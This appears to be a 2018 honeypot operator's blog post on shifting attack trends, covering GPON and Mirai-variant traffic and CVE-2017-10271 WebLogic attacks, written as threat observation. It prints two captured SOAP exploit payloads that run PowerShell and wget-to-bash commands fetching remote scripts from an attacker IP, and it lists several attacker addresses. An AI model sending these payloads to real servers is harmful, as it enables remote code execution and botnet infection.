---
title: "Attack Movement"
#author: "Author Name"
description: "Discussion about general movement of attackers from one attack type to another over time"
#cover: "/img/cover.jpg"
#tags: ["tagA", "tagB"]
date: 2018-06-14T00:00:00-00:00
draft: false
---
It's strange how attacks seem to move around on a weekly/monthly basis.  Up until recently I saw a number of attacks against GPON, and today I don't see a single one.  There is some probability in this - I occupy only a small amount of IP space, so with a given number of attackers throwing a given number of attacks per second, some portion of the IP space less than 100% will be hit.  Tomorrow maybe I'll see some GPON again.  Certainly, though, it seems like the frequency of GPON attacks have gone down, and perhaps that reflects some lowered success rate by hackers.  Maybe owners of that software have mostly patched by now, or maybe attackers have closed off the attack vector behind them, leaving the others to wish they'd gotten there first.

I always see lots of Mirai and Mirai-derived traffic.  There's no shortage.  This has begun to change recently - I see new filenames being used periodically.  This morning I found a download link in both FTP and HTTP, repeated a bunch, using techniques similar to Mirai to get in, that happened around midnight.  When I went to download the files though - the target did not respond.  Perhaps the attacker uses some modicum of opsec - closing down ports when not actively attacking, or possibly even only opening ports to targets he/she is actively exploiting.  The attacker was coming directly from the same address they were offloading the infection script from, too.  That is a little different than most Mirai traffic I've seen - redirecting to some central C2/download point.  Alternatively - it was just the first reaches of someone who was trying to spread their botnet.

Back on port 8080 though, I've seen a huge increase in recent days of traffic to /wls-wsat/CoordinatorPortType.  This seems to be related to CVE-2017-10271, which is not new.  This bug is 6-9 months old...  Here are a couple ways exploitation is attempted.

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3" >
            <void index="0">
              <string>cmd</string>
            </void>
            <void index="1">
              <string>/c</string>
            </void>
            <void index="2">
              <string>cmd /c powershell.exe -w 1 -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('hxxp://107.181.174.232/win/checking.ps1'))</string>
            </void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3" >
            <void index="0">
              <string>/bin/sh</string>
            </void>
            <void index="1">
              <string>-c</string>
            </void>
            <void index="2">
              <string>wget --user-agent linux -O - hxxp://107.181.174.232/lin/st.sh | bash</string>
            </void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

Two download attempts, same IP address.  Unfortunately, again, when attempting download later on, some router or firewall has blackholed this host - now a device in the route responds with "No route to host".  Probably "Total Server Solutions L.L.C." noticed the attack traffic and blackholed the host, or perhaps they "no route to host" any address that is not actively in use to cut down on bot traffic, and the user stopped their VM.

UPDATE - the cat came back the very next day!  The Mirai-like traffic came back with a similar attack pattern as yesterday.  It seems like the same individual, now coming from a different IP address.  This time, 167.99.215.155, part of DigitalOcean's chunk of IPs.  And, this brings a new site to my attention, urlhaus.abuse.ch.  It seems very relevant to what I'm trying to do.  I see that this site has already reported that IP address to DigitalOcean as abuse, and that they have reported the other IP address I see in my logs with the same Mirai-like traffic - 159.65.195.209 - another DigitalOcean address.  This actor, assuming it's all one person, which seems possible, must be tired of hopping addresses.

Also - based upon some of the behavior of this malware, I'd say it's the iDdosYou variant of Mirai.
